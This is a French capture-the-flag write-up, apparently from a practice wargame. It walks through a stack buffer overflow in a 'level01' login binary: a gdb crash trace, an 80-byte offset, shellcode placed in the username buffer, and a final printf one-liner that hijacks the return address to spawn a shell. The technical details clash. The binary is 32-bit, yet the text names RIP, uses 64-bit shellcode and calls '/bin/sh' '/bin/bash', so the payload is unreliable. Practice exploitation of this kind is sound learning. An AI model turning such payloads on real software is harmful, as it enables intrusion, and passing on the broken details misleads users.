En utilisant gdb et en donnant en mot de passe jusqu'a 100 'a' on peut voir que le programme essaye d'executer du code a l'address 0x61616161 (qui correspond a un morceau de notre chaine "aaaa").
```
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) bt
#0  0x61616161 in ?? ()
#1  0x0000000a in ?? ()
#2  0xffffd7b4 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```
On en deduit que le registre RIP est a un moment charge par une valeur qu'on ecrase par ce qu'on ecrit. On aimerait controller precisement quelle valeur on va mettre dans RIP pour executer le code qu'on veut.

## Calculer l'offset
On peut utiliser un outil pour calculer cet offset: https://wiremask.eu/tools/buffer-overflow-pattern-generator/

Offset: 80

## Le code
Il nous faut un buffer dans lequel mettre le code qu'on veut executer. Le buffer du nom d'utilisateur peut faire l'affaire. Son adresse est 0x0804a040 d'apres objdump -x, on rajoute 7 pour prendre en compte "dat_wil"

`dat_wil + le code`

`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac + \x47\xa0\x04\x08\x00\x00\x00\x00`

Le code en question est sous forme d'instructions directement comprehensible par le CPU. Le site shell-storm repertorie differents code machines qui pourraient nous interesser, pour executer la fonction execve avec comme argument "/bin/bash":
`\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05`

## Final
`printf "dat_wil\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05\n%80c\x47\xa0\x04\x08\x00\x00\x00\x00\n" A`
